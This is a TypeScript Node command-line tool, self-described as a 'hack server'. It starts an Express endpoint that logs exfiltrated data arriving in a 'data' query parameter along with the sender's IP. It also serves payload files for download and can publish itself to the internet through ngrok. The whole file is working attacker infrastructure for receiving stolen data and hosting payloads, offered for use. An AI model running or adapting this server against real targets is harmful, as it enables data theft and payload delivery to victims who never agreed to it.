#!/usr/bin/env node
import express from 'express'
import yargs from 'yargs'
import getPayloadObject from './payload'
import cors from 'cors'
import { networkInterfaces } from 'os'
import ngrok from '@ngrok/ngrok'
import type * as http from 'http'

const networkInfo = networkInterfaces()
type TNetworkInterface = keyof typeof networkInfo

const getUrl = (port: number, networkInterface?: TNetworkInterface) => {
  const host = networkInterface
    ? networkInfo[networkInterface]?.[0].address
    : 'localhost'

  return `http://${host}:${port}`
}

type TStartServerArgs = {
  port: number
  networkInterface: TNetworkInterface | undefined
  payload: string | string[] | Record<string, string> | unknown
}

const startServer = async ({
  port,
  networkInterface,
  payload,
}: TStartServerArgs): Promise<http.Server> => {
  const payloadObj = payload && getPayloadObject(payload)

  const app = express()

  app.use(express.json())
  app.use(express.urlencoded({ extended: true }))
  app.use(cors())

  app.all('/', (req, res) => {
    const data = req.query.data && decodeURI(req.query.data as string)
    console.log(`\n${new Date().toLocaleString()} – ${req.method} - ${req.ip}`)
    console.log(data || "No 'data' query parameter given")
    res.sendStatus(200)
  })

  if (payloadObj) {
    Object.entries(payloadObj).forEach(([key, value]) => {
      app.get(`/${key}`, (req, res) => {
        console.log(
          `\n${new Date().toLocaleString()} – ${req.method} - ${req.ip}`
        )
        console.log(`${value} downloaded, url: ${req.url}`)
        res.sendFile(value)
      })
    })
  }

  return new Promise((resolve) => {
    const server = app.listen(port, async () => {
      const url = getUrl(port, networkInterface)

      if (payloadObj) {
        console.log(
          `Payloads: ${Object.entries(payloadObj)
            .map(([key, value]) => `\n\t${url}/${key}\t–\t${value}`)
            .join('')}`
        )
      }
      resolve(server)
    })
  })
}

type TNgrokOptions = {
  authtoken?: string
}

const exposeServer = async (port: number, ngrokOptions: TNgrokOptions = {}) => {
  const url = await ngrok.connect({
    addr: port,
    authtoken_from_env: true,
    authtoken: ngrokOptions.authtoken,
  })
  console.log(`Server exposed in ${url}`)
}

yargs(process.argv.slice(2))
  .command(
    '$0',
    'Starts a server to receive data from the hack',
    (yargs) =>
      yargs
        .option('networkInterface', {
          alias: 'n',
          type: 'string',
          description: 'The network interface to use',
          choices: Object.keys(networkInfo),
        })
        .option('port', {
          alias: 'p',
          type: 'number',
          description: 'Port to run the server in',
          default: 3000,
        })
        .option('payload', {
          alias: 'l',
          description: 'Payload file (array, object or string) to serve',
        })
        .option('ngrok', {
          alias: 'g',
          type: 'boolean',
          description: 'Use ngrok to expose the server',
        })
        .options('ngrok-authtoken', {
          alias: 't',
          type: 'string',
          description: 'ngrok authtoken',
        }),
    async (args) => {
      await startServer(args)
      const url = getUrl(args.port, args.networkInterface)
      console.log(`Hack server started on port ${args.port} 😈`)
      if (args.networkInterface) {
        console.log(`Available in ${args.networkInterface} interface in ${url}`)
      } else {
        console.log(`Available in ${url}`)
      }
      if (args.ngrok) {
        await exposeServer(args.port, {
          authtoken: args['ngrok-authtoken'],
        })
      }
    }
  )
  .parse()
